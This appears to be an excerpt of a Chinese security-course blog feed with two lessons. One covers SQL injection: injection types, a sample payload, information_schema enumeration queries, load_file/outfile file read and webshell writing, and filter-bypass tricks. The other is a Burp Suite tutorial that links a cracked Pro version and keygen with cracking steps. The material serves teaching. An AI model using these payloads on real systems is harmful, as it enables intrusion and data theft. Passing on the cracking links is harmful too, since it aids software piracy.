style="margin-right:0.01968em;">l</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">&quot;</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.946332em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">o</span><span class="mord mathnormal">m</span><span class="mord mathnormal">u</span><span class="mord mathnormal">s</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">h</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">e</span><span class="mord mathnormal">p</span><span class="mord mathnormal">a</span><span class="mord mathnormal">s</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>pwd%’ order by password&quot;;</p><p>这句 SQL 的语句就是基于用户输入的 pwd 在 users 表中找到相应的 password，正常用户当然会输入例如 admin,ckse 等等。但是如果有人输入这样的内容呢？</p><p>‘and 1=1 and ‘%’=’</p><p>这样的话这句 SQL 语句就变成了这样：</p><p>select * from user where password like ‘%pwd’and 1=1 and ‘%’=’%’ order by password</p></li><li><p>布尔盲注（Boolean-based blind SQL injection）</p><p>即可以根据返回页面判断条件真假的注入</p></li><li><p>时间盲注（Time-based blind SQL injection）</p><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；</p></li><li><p>报错注入（Error-based SQL injection）</p><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；</p></li><li><p>联合注入（UNION query SQL injection）</p><p>可以使用 union 的情况下的注入 ；</p></li><li><p>堆叠查询注入（Stacked queries SQL injection）</p><p>可以同时执行多条语句的执行时的注入；</p></li></ul><h3 id="7sql注入常规利用思路"><a class="markdownIt-Anchor" href="#7sql注入常规利用思路">#</a> 7.SQL 注入常规利用思路</h3><ol><li><p>判断是否存在注入，注入是字符型还是数字型</p></li><li><p>猜解 SQL 查询语句中的字段数 order by N</p></li><li><p>确定显示的字段顺序</p></li><li><p>获取当前数据库</p></li><li><p>获取数据库中的表</p></li><li><p>获取表中的字段名</p></li><li><p>查询到账户的数据</p></li></ol><h2 id="二-mysql注入知识点"><a class="markdownIt-Anchor" href="#二-mysql注入知识点">#</a> 二、MYSQL 注入知识点</h2><p>在渗透中，目前主流站点的站点架构一般为 APACHE+PHP+MYSQL，所以我们主要来学习下 MySQL 数据库中与 SQL 注入相关的知识点。 这里主要学习 MySQL&gt;=5.0 版本之后的一个内置库 information_schema 库；</p><h3 id="1information_schema内置库介绍"><a class="markdownIt-Anchor" href="#1information_schema内置库介绍">#</a> 1.information_schema 内置库介绍</h3><ul><li><p>information_schema 数据库是 MySQL 自带的，它提供了访问数据库元数据的方式。元数据是关于数据的数据，如<strong>数据库名或表名，列的数据类型，或访问权限</strong>等；</p></li><li><p>在 MySQL 中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等；</p></li><li><p>在这个库中，和渗透相关的表有三个：</p><p>schemata 表：存储该用户创建的所有的数据库库名，这里我们只需要记住 SCHEMA_NAME (数据库名) 这个字段；</p><p>tables 表：存储该用户创建的所有的数据库库名和表名，这里我们只需要记住 TABLE_SCHEMA 和 TABLE_NAME 这两个字段；</p><p>columns 表：存储该用户创建的所有的数据库库名、表名和字段名，这里我们只需要记住 TABLE_SCHEMA、TABLE_NAME 和 COLUMN_NAME；</p></li><li><p>information_schema 内置库中与手工注入相关的表</p></li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626832340698-219b0e72-59c1-4951-8d9e-8933c7d121ef.png" alt="img"></p><ul><li>schemata 表，SCHEMA_NAME 字段中存放这 MySQL 中所有的库名；</li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626832651392-b4b7b43e-4b79-4b7d-b09c-db8fbd59e012.png" alt="img"></p><ul><li>tables 表，TABLE_SCHEMA 和 TABLE_NAME 分别存放着 MySQL 中的所有库名和表名；</li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626832686636-f4d4cd68-230d-451b-a727-4bebe1bb15dd.png" alt="img"></p><ul><li>columns 表，TABLE_SCHEMA、TABLE_NAME、COLUMN_NAME 分别存放着 MySQL 中的所有库名、表名、字段名；</li></ul><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1626832734069-d64578dc-23d7-4db0-aadd-487a45b3f3c7.png" alt="img"></p><h3 id="2mysql注入相关语句"><a class="markdownIt-Anchor" href="#2mysql注入相关语句">#</a> 2.MySQL 注入相关语句</h3><ul><li><p>查询当前数据库版本：select version ();</p></li><li><p>查询当前数据库：select database ();</p></li><li><p>查询当前路径：select @@basedir;</p></li><li><p>查询当前数据库用户：select user ();</p></li><li><p>查询当前 MySQL 路径：select @@datadir;</p></li><li><p>查询服务器的系统版本：select@@Version_compile_os;</p></li><li><p>查询数据库：select schema_name from information_schema.schemata;</p></li><li><p>查询表名：select table_name from information_schema.tables where table_schema=‘库名’ limit 0,1;</p></li><li><p>查询列名：select column_name from information_schema.columns where table_schema=‘库名’ and table_name=‘表名’ limit 0,1;</p></li></ul><h3 id="3函数"><a class="markdownIt-Anchor" href="#3函数">#</a> 3. 函数</h3><ul><li><p><strong>ascii () 函数 /ord () 函数</strong></p><p>将某个字符串转化为 ascii 值</p><p>语句：select ascii (mid (user (),1));</p></li><li><p><strong>sleep () 函数</strong></p><p>网页延迟 n 秒后，输出结果</p><p>语句：select sleep (5);</p></li><li><p><strong>if () 函数</strong></p><p>条件判断函数</p><p>if(a,b,c)</p><p>if 判断句，a 为条件，b、c 为执行语句；如果 a 为真就执行 b，a 为假就执行 c</p><p>语句：select if (length (database ())=5,1,0);</p></li><li><p><strong>length () 函数</strong></p><p>返回字段 / 结果 / 函数的长度</p><p>常用 length (database ()) 即返回当前数据库名长度</p><p>语句：select length (user ());</p></li><li><p><strong>rand () 函数</strong></p><p>随机函数，返回 0~1 之间的某个值</p><p>语句：select rand ();</p></li><li><p><strong>floor(a)</strong></p><p>取整函数，返回小于等于 a，且值最接近 a 的一个整数</p><p>语句：select floor (rand ()*2);</p></li><li><p><strong>count () 函数</strong></p><p>聚合函数也称作计数函数，返回查询对象的总数</p><p>语句：SELECT COUNT (*) FROM student;</p></li><li><p><strong>locate () 函数</strong></p><p>locate (str,string) 返回 str 字符在 string 字符串中出现的位置，没有返回 0</p><p>语句：select locate (‘r’,user ());</p></li><li><p><strong>position () 函数</strong></p><p>position (str in str) 返回 str 字符在 string 字符串中出现的位置，没有返回 0</p><p>语句：select position (‘r’ in user ());</p></li><li><p><strong>instr () 函数</strong></p><p>instr (string,str) 返回 str 字符串在 string 中出现的位置，与 locate 相同，只是参数顺序相反</p><p>语句：select instr (‘qweasdzXC’,‘w’);</p></li><li><p><strong>concat () 函数</strong></p><p>将一个或多个字符串连接成一个字符串，返回结果为连接参数产生的字符串，如果有任何一个参数为 null，则返回值为 null。</p><p>语句：concat (0x3a,database (),0x3a)；0x3a 为：号</p></li><li><p>在渗透测试中，通常情况下我们使用这个函数来查询数据库中同个表中的不同字段 (列)，如 concat (username,0x3a,password)，0x3a 为：(冒号) 的 hex（16 进制）编码，注意这是为了防止报错，常用的编码还有 0x7e (~)、0x2c (, 逗号)、0x21 (! 叹号)、0x5c (\ 斜杠)、0x5f (_下划线)、0x3c62723e (<br>换行标签) 等。</p></li><li><p><strong>concat_ws ()/group_concat () 函数</strong></p><p>使用分割符将一个或多个字符串连接成一个字符串，是 concat () 的特殊形式，第一个参数是其它参数的分隔符，分隔符的位置在连接的两个字符串之间，分隔符可以是一个字符串，也可以是其它参数。如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。</p><p>语句：select concat_ws (’!’,database (),‘haha’);</p><p>语句：select group_concat (username,’~’,password) from dh_admin_user;</p></li><li><p><strong>hex ()&amp;unhex () 函数</strong></p><p>渗透中有些注入点因为数据库中对数据字段的类型定义，可能不支持 union 来显示某些不同类型的内容，所以使用 hex 对数据进行十六进制编码；</p><p>语句：select hex (concat (user (),1));</p><p>语句：select unhex (‘726F6F74406C6F63616C686F737431’);</p><p>hex 参数可用于任何参数外面，hex (concat (xxoo))，hex (user ()),hex (database ())</p><p>unhex () 则是用来将十六进制的内容转换回十进制。</p></li><li><p><strong>substr ()/substring ()/mid () 函数</strong></p></li><li><ul><li>此函数是用来截取字符串一部分。substr (column_name,start,[length]),length 为可选项；</li><li>语句：select substr (user (),1,2);</li></ul></li><li><ul><li>语句：select substring (user (),1,2);</li><li>语法：select mid (user (),2);</li></ul></li><li><p><strong>left () 函数</strong></p></li><li><ul><li>left () 得到字符串左部指定个数的字符</li><li>语法：left (string, n)，string 为要截取的字符串，n 为截取的位数；</li></ul></li><li><ul><li>语句：select left (user (),5);</li></ul></li><li><p><strong>updatexml () 函数</strong></p></li><li><ul><li>updatexml () 函数与 extractvalue () 类似，是更新 xml 文档的函数。</li><li>语法 updatexml (目标 xml 文档，xml 路径，更新的内容)</li></ul></li><li><ul><li>语句：select  updatexml (‘anything’,concat (’~’,(select version ())),‘xxx’);</li><li>注意：xml 路径中的位置是可操作的地方，xml 文档中查找路径格式是用 /xxx/xxx/xxx/ 这种格式，如果写入其他格式，就会报错，并且会返回写入的非法格式内容，这也是报错的原理之一；</li></ul></li><li><p><strong>extractvalue () 函数</strong></p></li><li><ul><li>extractvalue () 函数是对 XML 文档进行查询的函数</li><li>其实就是相当于 HTML 文件中用 <div><p><a>标签查找元素一样</li></ul></li><li><ul><li>语法：extractvalue (目标 xml 文档，xml 路径)</li><li>语句：select extractvalue (‘anything’,concat (’~’,(select user ())));</li></ul></li><li><ul><li>注意：xml 路径中的位置是可操作的地方，xml 文档中查找路径格式是用 /xxx/xxx/xxx/ 这种格式，如果写入其他格式，就会报错，并且会返回写入的非法格式内容，这也是报错的原理之一。</li></ul></li><li><p><strong>load_file () 函数</strong></p></li><li><ul><li>load_file () 函数是 MySQL 读取本地文件的函数</li><li>语法：select load_file (‘D:/phpstudy_pro/Extensions/MySQL5.7.26/my.ini’);</li></ul></li><li><ul><li>前提条件：</li></ul></li><li><ul><li><ul><li>必须有权限读取且文件是可读的，低权限无法读取高权限用户文件</li><li>被文件必须在服务器上</li></ul></li></ul></li><li><ul><li><ul><li>必须知道文件的绝对路径   可用：select @@basedir;</li><li>读取的文件必须小于设定：max_allowed_packet</li></ul></li></ul></li><li><ul><li><ul><li>secure_file_priv 的值不为 NULL   使用 show global variables like ‘% secure%’; 查询是否为空，在 my.ini 设置为：secure_file_priv = ‘’</li></ul></li></ul></li><li><ul><li><ul><li><ul><li>查询结果为：secure_file_priv  NULL 时，表示不允许导入导出；</li><li>查询结果为：secure_file_priv  /xxx/ 时，表示只允许在当前目录导入导出；</li></ul></li></ul></li></ul></li><li><ul><li><ul><li><ul><li>查询结果为：secure_file_priv（空白）时，表示可以在任意目录进行导入导出；</li></ul></li></ul></li></ul></li><li><ul><li><ul><li>MySQL5.6.34 版本以后 secure_file_priv 的值默认为 NULL。且无法用 sql 语句对其进行修改，只能够通过以下方式修改 mysql.ini 或 my.cnf：</li></ul></li></ul></li><li><ul><li><ul><li><ul><li><ul><li>Windows：my.ini 中添加 secure_file_priv=</li><li>Linux：/etc/my.cnf 的 [mysqld] 下面添加 local-infile=0</li></ul></li></ul></li></ul></li></ul></li><li><p><strong>into outfile () 函数</strong></p></li><li><ul><li>into outfile () 函数是用来导出文件的；</li><li>用法示例：select “hello word” into outfile ‘D:\phpstudy_pro\WWW\1.txt’;</li></ul></li><li><ul><li>注意：</li></ul></li><li><ul><li><ul><li>在 SQL 注入时，我们可以利用 load_file 或者 into outfile () 对文件进行读取，或者写入 Webshell；</li><li>若过滤了单引号，则可以将函数中的字符进行 hex 编码；</li></ul></li></ul></li></ul><h3 id="4注释符"><a class="markdownIt-Anchor" href="#4注释符">#</a> 4. 注释符</h3><ul><li><p>在 MySQL 中，常见得注释符有以下几种：</p></li><li><ul><li>#</li><li>–空格</li></ul></li><li><ul><li>/**/</li></ul></li><li><p>内联注释符及特性</p></li><li><ul><li>/*! code */</li><li>内联注释符是一种基于注块注释衍生出来的注释风格，它可以用于整个 SQL 语句中，用来执行 SQL 语句，内联注释有个特殊点，和 MySQL 版本息息相关，也就是：当内联注释中出现小于或等于当前版本号得时候，内联注释符里得子句会被执行，大于时则不会呗执行，注意版本得写法，列如：5.5.34，在内敛注释中血药写成为 50534，版本号第二位加 0；</li></ul></li><li><p>常见得空格符号</p></li><li><ul><li>两个空格代替一个空格，用 tab 代替空格，% a0 = 空格</li><li>%20  %09  %0a  %0b  %0c  %0d  %a0  %00  /**/  /<em>!</em>/</li></ul></li></ul><iframe style="width: 1px; height: 1px; position: absolute; left: -100px; bottom: -100px; display: none;" src="https://tracert.alipay.com/cross.html"></iframe>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第四天sql注入-上&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#第四天sql注入-上&quot;&gt;#&lt;/a&gt; 第四天：SQL 注入 - 上&lt;/h1&gt;
&lt;h2 id=&quot;课堂导学&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; hre</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/BurpSuite%E4%BD%BF%E7%94%A8/"/>
    <id>https://sun-spots.github.io/2022/03/04/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/%E7%AC%AC%E4%BA%8C%E9%98%B6%E6%AE%B5/%E7%AC%AC%E4%B8%80%E5%91%A8/BurpSuite%E4%BD%BF%E7%94%A8/</id>
    <published>2022-03-04T01:35:01.341Z</published>
    <updated>2022-03-04T01:36:20.849Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第三天burpsuite使用"><a class="markdownIt-Anchor" href="#第三天burpsuite使用">#</a> 第三天：BurpSuite 使用</h1><h1 id="img"><a class="markdownIt-Anchor" href="#img">#</a> <img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625735135940-c0de8bcb-4afa-4471-9f83-22d8e71bead4.png" alt="img"></h1><h1 id="环境变量配置"><a class="markdownIt-Anchor" href="#环境变量配置">#</a> 环境变量配置</h1><p>由于 BurpSuite 是由 JAVA 编译所以先安装 JAVA 环境</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625735304937-1ea9f7e4-abc1-4bbf-9631-a0a6406fe995.png" alt="img"></p><p>JAVA 环境安装与配置，双击 jdk.exe 安装 JAVA，打开后点击下一步</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625735319539-c2c6b971-693e-43c9-bafd-7b66ebd9a3ef.png" alt="img"></p><p>记住安装路径，安装路径默认即可，并点击下一步，等待安装</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2942226/1625735333618-cb1febfa-beab-4a63-a70d-ce10230405d4.png" alt="img"></p><p>配置 JAVA 环境，需要配置三个环境变量：</p><p>1. 在 &quot;系统变量&quot; 栏，“新建”，“变量名 &quot;为&quot;Java_Home”</p><p>&quot;变量值&quot; 为 JDK 安装路径：“C:\Program Files\Java\jdk1.8.0_121”</p><p>2. 在 &quot;系统变量&quot; 栏，“新建”，“变量名 &quot;为&quot;CLASSPATH”，</p><p>加入：&quot;.;% Java_Home%\bin;% Java_Home%\lib\dt.jar;% Java_Home%\lib\tools.jar&quot;</p><p>3. 选中 &quot;Path&quot; 点击 &quot;新建&quot;，&quot;编辑&quot; 选项</p><p>加入：&quot;% Java_Home%\bin;% Java_Home%\jre\bin;&quot;</p><p>在 CMD 下输入，java、javac、java -version 查看是否配置成功</p><h1 id="burp简介及配置"><a class="markdownIt-Anchor" href="#burp简介及配置">#</a> Burp 简介及配置</h1><h2 id="burp简介"><a class="markdownIt-Anchor" href="#burp简介">#</a> Burp 简介</h2><p>Burp Suite 是一个集成化的渗透测试工具，它集合了多种渗透测试组件，使我们自动化地或手 工地能更好的完成对 web 应用的渗透测试和攻击。在渗透测试中，我们使用 Burp Suite 将使得 测试工作变得更加容易和方便，即使在不需要娴熟的技巧的情况下，只有我们熟悉 Burp Suite 的使用，也使得渗透测试工作变得轻松和高效；</p><p>Burp Suite 是由 Java 语言编写而成，而 Java 自身的跨平台性，使得软件的学习和使用更加方 便。Burp Suite 不像其他的自动化测试工具，它需要你手工的去配置一些参数，触发一些自动 化流程，然后它才会开始工作。 Burp Suite 可执行程序是 java 文件类型的 jar 文件，免费版的可以从免费版下载地址进行下载。 免费版的 Burp Suite 会有许多限制，很多的高级工具无法使用，如果您想使用更多的高级功 能，需要付费购买专业版；</p><p>专业版与免费版的主要区别有：</p><ul><li><ul><li>Burp Scanner 模块</li><li>工作空间的保存和恢复</li></ul></li><li><ul><li>拓展工具，如 Target Analyzer, Content Discovery 和 Task Scheduler</li></ul></li></ul><p>burpsuite_pro_v2.1.05 下载地址：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMUVpWktSS2s1d1BFaW1lSmw3S21XdHclRUYlQkMlOEMlRTYlOEYlOTAlRTUlOEYlOTYlRTclQTAlODElRUYlQkMlOUEyMmxw">https://pan.baidu.com/s/1EiZKRKk5wPEimeJl7KmWtw，提取码：22lp</span></p><p>注册机下载：<span class="exturl" data-url="aHR0cHM6Ly9zcWxzZWMubGFuem91eC5jb20vaWNjaDBxaA==">https://sqlsec.lanzoux.com/icch0qh</span></p><p>汉化包：<span class="exturl" data-url="aHR0cHM6Ly93d3cubGFuem91eC5jb20vaTc4ZTdiYw==">https://www.lanzoux.com/i78e7bc</span></p><h3 id="破解步骤"><a class="markdownIt-Anchor" href="#破解步骤">#</a> 破解步骤</h3><p>打开  burp-loader-keygen-2_1_05 运行后单击 run 运行 brupsuite  点击 run，复制 license 内的内容复制到 burpusite 内；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627804173703-bf24487e-4175-4775-9bfb-73550dcb189a.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627804185354-45ecd620-bb32-4b08-8478-c6982f11db35.png" alt="img"></p><p>单击 next  单击 manual activation 将 brpusteie action request 内容复制到注册机生产一个 key 再复制到 brupsuite</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627805360801-76092546-4496-4505-b867-cdb3d51ec556.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627805481264-d6541900-4c10-4ef9-982e-7dbb1cf311ba.png" alt="img"></p><p>汉化快捷启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Burp_start_ch.vbs:</span><br><span class="line">CreateObject(&quot;WScript.Shell&quot;).Run &quot;java -noverify -Dfile.encoding=utf-8 -javaagent:BurpSuiteCn.jar -Xbootclasspath/p:burp-loader-keygen-2_1_05.jar -jar burpsuite_pro_v2.1.05.jar&quot;,0</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627797812761-c790528b-ad0d-4d83-8b9c-a6604c0e5acd.png" alt="img"></p><h2 id="burp配置"><a class="markdownIt-Anchor" href="#burp配置">#</a> Burp 配置</h2><p>工作原理：</p><p>Burp Suite 代理工具是以拦截代理的方式，拦截所有通过代理的网络流量，如客户端的请求数 据、服务器端的返回信息等。Burp Suite 主要拦截 http 和 https 协议的流量，通过拦截，Burp Suite 以中间人的方式，可以对客户端请求数据、服务端返回做各种处理，以达到安全评估测 试的目的；</p><p>在日常工作中，我们最常用的 web 客户端就是的 web 浏览器，我们可以通过代理的设置，做到 对 web 浏览器的流量拦截，并对经过 Burp Suite 代理的流量数据进行处理；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627636661406-7fb56cba-ea7f-4839-81b5-6e91bfcda3ab.png" alt="img"></p><p>配置 burp 默认的代理位置：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627797829244-f79ed14a-2854-4054-ac83-15264e7b6729.png" alt="img"></p><p>配置我们浏览器的代理位置：</p><p><strong>Chrome 浏览器：</strong></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627797847987-60654ad7-c12b-45c3-a52c-0413663f1b72.png" alt="img"></p><p><strong>Firefox 浏览器：</strong></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627797866255-7aa7cfa3-f03a-4aae-980b-49178ab51276.png" alt="img"></p><p>导入证书：</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627636772135-7508fb54-2473-4a72-b66a-3f2b674177ab.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627797935245-aa20bd73-f5fb-4b49-9076-4d69d23fe038.png" alt="img"></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627797943959-13299ecd-6401-4ea4-8f45-b7e93cbcdc59.png" alt="img"></p><p>Chrome 浏览器同理</p><h1 id="burp使用"><a class="markdownIt-Anchor" href="#burp使用">#</a> Burp 使用</h1><h2 id="抓包"><a class="markdownIt-Anchor" href="#抓包">#</a> 抓包</h2><p>Burp 开启代理，<span class="exturl" data-url="aHR0cDovL3huLS1iYWlkdS1jejFpNDE4a2N2OWJueWQ0NTVhLmNvbQ==">浏览器访问 baidu.com</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627797983852-80885aa4-5b57-4ef6-9e95-24a3c8f5f78e.png" alt="img"></p><h2 id="burp模块介绍"><a class="markdownIt-Anchor" href="#burp模块介绍">#</a> Burp 模块介绍</h2><h3 id="仪表盘dashboard"><a class="markdownIt-Anchor" href="#仪表盘dashboard">#</a> 仪表盘 (Dashboard)：</h3><p>主要分为三块：Tasks (任务)、Event log (事件日志)、issue activity (动态发现的问题)；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627797994659-b96bd965-d47b-4d8f-8fa2-e9d6b0fbbdf6.png" alt="img"></p><h3 id="目标target"><a class="markdownIt-Anchor" href="#目标target">#</a> 目标 (Target)：</h3><p>Target 组件主要包含站点地图、目标域、Target 工具三部分组成，他们帮助渗透测试人员更好地了解目标应用的整体状况、当前的工作涉及哪些目标域、分析可能存在的攻击面等信息；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798006044-2696b695-2afe-4cdb-a8b1-3b12d75b6c59.png" alt="img"></p><h4 id="主动扫描active-scanning"><a class="markdownIt-Anchor" href="#主动扫描active-scanning">#</a> 主动扫描（Active Scanning）</h4><p>​当使用主动扫描模式时，Burp 会向应用发送新的请求并通过 payload 验证漏洞。这种模式下的 操作，会产生大量的请求和应答数据，直接影响系统的性能，通常使用在非生产环境；</p><p>它对 下列的两类漏洞有很好的扫描效果：</p><p>​1. 客户端的漏洞，像 XSS、Http 头注入、操作重定向；</p><p>​2. 服务端的漏洞，像 SQL 注入、命令行注入、文件遍历；</p><p>对于第一类漏洞，Burp 在检测时，会提交一下 input 域，然后根据应答的数据进行解析。在检 测过程中，Burp 会对基础的请求信息进行修改，即根据漏洞的特征对参数进行修改，模拟人 的行为，以达到检测漏洞的目的；</p><p>对于第二类漏洞，一般来说检测比较困难，因为是发生在 服务器侧。比如说 SQL 注入，有可能是返回数据库错误提示信息，也有可能是什么也不反 馈。Burp 在检测过程中，采用各个技术来验证漏洞是否存在，比如诱导时间延迟、强制修改 Boolean 值，与模糊测试的结果进行比较，已达到高准确性的漏洞扫描报告；</p><h4 id="被动扫描passive-scanning"><a class="markdownIt-Anchor" href="#被动扫描passive-scanning">#</a> 被动扫描（Passive Scanning）</h4><p>当使用被动扫描模式时，Burp 不会重新发送新的请求，它只是对已经存在的请求和应答进行分析，这对系统的检测比较安全，尤其在你授权访问的许可下进行的，通常适用于生成环境的检测；</p><p>虽然被动扫描模式相比于主动模式有很多的不足，但同时也具有主动模式不具备的优点，除了前文说的对系统的检测在我们授权的范围内比较安全外，当某种业务场景的测试，每测试一次都会导致业务的某方面问题时，我们也可以使用被动扫描模式，去验证问题是否存在， 减少测试的风险；</p><h3 id="代理proxy"><a class="markdownIt-Anchor" href="#代理proxy">#</a> 代理 (Proxy)：</h3><p>是一个拦截 HTTP/S 的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798018249-f8a0e6b3-b935-4327-aa21-2173df8e3b2b.png" alt="img"></p><p><strong>Action</strong>：说明一个菜单可用的动作行为操作可以有哪些操作功能</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627637121178-29c7c1fb-4a10-4546-b938-54566a0789da.png" alt="img"></p><h3 id="入侵intruder"><a class="markdownIt-Anchor" href="#入侵intruder">#</a> 入侵 (Intruder)：</h3><p>可配置的工具，对 web 应用程序进行自动化攻击。此功能有多种用途，如漏洞利用、Web 应用程序模糊测试、进行暴力破解等；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798040017-af26baaa-0273-4a99-812b-55c8060b5760.png" alt="img"></p><h4 id="常用的应用场景"><a class="markdownIt-Anchor" href="#常用的应用场景">#</a> 常用的应用场景：</h4><p><strong>标识符枚举</strong></p><p>Web 应用程序经常使用标识符来引用用户、账户、资产等数据信息。例如， 用户名，文件 ID 和账户号码；</p><p><strong>提取有用的数据</strong></p><p>在某些场景下，而不是简单地识别有效标识符，你需要通过简单标识符提取一些其他的数据。比如说，你想通过用户的个人空间 id，获取所有用户在个人空间标准的昵称和年龄；</p><p><strong>模糊测试</strong></p><p>很多输入型的漏洞，如 SQL 注入，跨站点脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。由 于的应用程序的大小和复杂性，手动执行这个测试是一个耗时且繁琐的过程。这样的场景，您可以设置 Payload，通过 BurpIntruder 自动化地对 Web 应用程序进行模糊测试；</p><h4 id="positions位置"><a class="markdownIt-Anchor" href="#positions位置">#</a> Positions (位置)：</h4><p>可以在这个模块中修改参数，选择攻击类型先使用 Clear 清空参数，然后使用 Add 添加参数 ；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798064757-0afc284b-3f7a-4acf-a90a-3497f887c020.png" alt="img"></p><h4 id="attack-type-攻击类型"><a class="markdownIt-Anchor" href="#attack-type-攻击类型">#</a> Attack type 攻击类型:</h4><p>Sniper (狙击手模式): 一个字典，两个参数，先匹配第一个参数，再匹配第二个参数；</p><p>Battering ram (攻城锤模式): 一个字典，两个参数，一个字典同时匹配两个参数，同用户名同密码；</p><p>Pitchfork (草叉模式): 两个字典，两个参数，两个字典分别匹配两个参数，到短的截至；</p><p>Cluster bomb (集束炸弹模式): 两个字典，两个参数，交叉匹配 (使用第一个字典的第一项匹配第一个；</p><h3 id="重放repeater"><a class="markdownIt-Anchor" href="#重放repeater">#</a> 重放 (Repeater)：</h3><p>手动操作来触发单独的 HTTP 请求，并进行应用程序响应的工具。此功能用于根据不同的情况修改和发送相同的请求并分析，通过调整 Request 的参数，不断尝试，通过 Response 查看状态。从而节省在浏览器中操作的时间；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798086254-ab5444ce-022f-4b2b-8dd0-69968e769f19.png" alt="img"></p><h3 id="序列器sequencer"><a class="markdownIt-Anchor" href="#序列器sequencer">#</a> 序列器 (Sequencer)：</h3><p>Sequencer 是一种用于分析数据样本随机性质量的工具。可以用它测试程序的会话令牌 (Session token)、密码重置令牌是否可预测等场景，通过 Sequencer 的数据样本分析，能够很好的降低这些关键数据被伪造的风险；</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627798101455-75083e4f-8322-4c5b-8c6b-30cb3f7da6a6.png" alt="img"></p><h4 id="live-capture-信息截取"><a class="markdownIt-Anchor" href="#live-capture-信息截取">#</a> Live capture 信息截取：</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627637472016-b8379249-c215-4b69-81e6-319dca5b78d9.png" alt="img"></p><p><img 